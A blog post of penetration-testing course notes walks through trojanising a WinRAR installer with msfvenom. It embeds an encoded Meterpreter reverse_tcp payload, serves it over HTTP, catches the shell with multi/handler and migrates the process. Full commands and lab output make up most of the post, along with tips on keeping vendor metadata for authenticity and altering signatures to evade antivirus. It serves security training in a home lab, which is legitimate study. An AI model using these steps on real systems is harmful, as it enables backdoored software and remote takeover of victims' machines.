---
layout: post
title: "Injecting Payloads Into Windows Portable Executables"
date: "2023-01-16"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Injecting Payloads Into Windows Portable Executables（将有效负载注入 Windows 可移植可执行文件）
# Demo: Injecting Payloads Into Windows Portable Executables（演示：将有效负载注入 Windows 可移植可执行文件）

```
msfvenom
```

[MSFVENOM](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

```
-x, --template              Specify a custom executable file to use as a template
    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
```

```
-x, --template 指定一个自定义的可执行文件作为模板
     -k, --keep 保留模板行为并将有效负载作为新线程注入
```

`-x`: In this case, we are trying to inject our payload into.

You can also utilize the `-k` option in conjunction with the `-x` option to preserver the template behavior and inject the payload as a new thread.

Try and inject your payload into the legitimate executable.

In order to do this, we'll first of all require a legitimate protable executable. Some portable executables may not allow for successful injection. In my experience, one of the best options that you can utilize is the WinRAR executable.

[WinRAR](https://www.win-rar.com/)

We're going to generate a 32-bit Meterpreter payload and then inject it into the WinRAR set up file.

We can download the 32-bit set up file.

`-e`: specify the encoder.

`-i`: increase the encoding iterations to 10.

`-f`: the output format.

`-x`: specify the portable executable that we want to inject our payload into.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar.exe
```

We can now transfer this over to the target. I'll set up a web server to host these files within this directory.

```
sudo python -m SimpleHTTPServer 80
```

Set up our listener or multi handler. Set the payload that we used to generate our executables.

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```

Switch over to the Windows system.

```
http://10.10.10.5/
```

That looks like the WinRAR setup file. However, because we did not specify the `-k` option to maintain the functionality of the executable, when we double click on it, it will not provide us with the WinRAR installer. It'll execute the payload. However, if you take a look at the file description, it still maintains the company and developer that developed WinRAR, which can help with the authenticity when you're trying to perform a client side attack. It also provides it with a file version.

Once we execute it, it is going to execute the payload in memory.

Switch over to the Kali VM. We get a Meterpreter session.

We still have access to the Windows system.

```
meterpreter > sysinfo
```

Once you've established access on a target system through a client side attack, one of the command I would recommand that you run is the post-exploitation module called migrate. 

This post-exploitation module is a Windows post-exploitation module that will manage the process that the Meterpreter payload is currently running on to another one, or it'll inject it into another one in the event that process if eventually stopped by Windows. This can be very useful in preventing that from happening. 

It'll migrate the process into another one.

```
meterpreter > run post/windows/manage/migrate
```

We have successfully been able to migrate our process.

```
meterpreter > sysinfo
meterpreter > ls
```

`-k`: maintain the functionality of the portable executable that you're injecting your payload into. 

What this means is that if we inject our Meterpreter payload into the WinRAR setup file, what will happen is when we transfer that executable onto the target system and then the target clicks on it, it will launch up the WinRAR setup or installer, so it's going to maintain the original functionality of the portable executable. And it's then going to execute the meterpreter payload and consequently provide us with a meterpreter session. 

However, this will not work for most portable executables out there.

And in the case of WinRAR, let's test and see whether this will work.

`-k`: Keep the original functionality of the WinRAR setup file.

We should get an error because this particular portable executable may not provide us with the ability to inject the payload, and furthermore, retain the original functionality.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payloads/winrar-new.exe
```

This will require a lot of testing, and you can try it out with various portable executables or setup files and see which ones you have luck with.

This technique is really not used anymore, primarily because of the fact that antivirus solutions have become much more advanced and their signature database is quite comprehensive in regards to the ability to detect payloads, especially payloads generated by msfvenom. However this technique will help you in furthermore modifying or changing the actual signature, because you are now injecting the shellcode into a legitimate executable. So you can test this with other executables.

# Home Lab
Kali: 192.168.248.150

Windows 7 SP1: 192.168.248.150

```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x /root/Downloads/winrar-x32-611.exe > /root/payloads/Windows_Payloads/winrar.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 3222736 bytes
```

```
┌──(root㉿kali)-[~/payloads/Windows_Payloads]
└─# python2 -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

```
msf6 > use multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.248.148
LHOST => 192.168.248.148
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234 
```

```
[*] Sending stage (175686 bytes) to 192.168.248.150
[*] Meterpreter session 1 opened (192.168.248.148:1234 -> 192.168.248.150:49273) at 2023-01-16 04:53:49 -0500

meterpreter > sysinfo
Computer        : IEWIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

```
meterpreter > run post/windows/manage/migrate

[*] Running module against IEWIN7
[*] Current server process: winrar.exe (2476)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 1932
[+] Successfully migrated into process 1932
```

```
meterpreter > sysinfo
Computer        : IEWIN7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > ls
Listing: C:\Users\IEUser\Downloads
==================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100666/rw-rw-rw-  282      fil   2022-10-08 23:04:31 -0400  desktop.ini
100777/rwxrwxrwx  73802    fil   2023-01-16 01:01:05 -0500  encodedx86.exe
100777/rwxrwxrwx  73802    fil   2023-01-14 19:35:23 -0500  payloadx86.exe
100777/rwxrwxrwx  3222736  fil   2023-01-16 20:49:16 -0500  winrar.exe
```

```
┌──(root㉿kali)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.248.148 LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x /root/Downloads/winrar-x32-611.exe > /root/payloads/Windows_Payloads/winrar-new.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Error: The template file doesn't have any exports to inject into!
```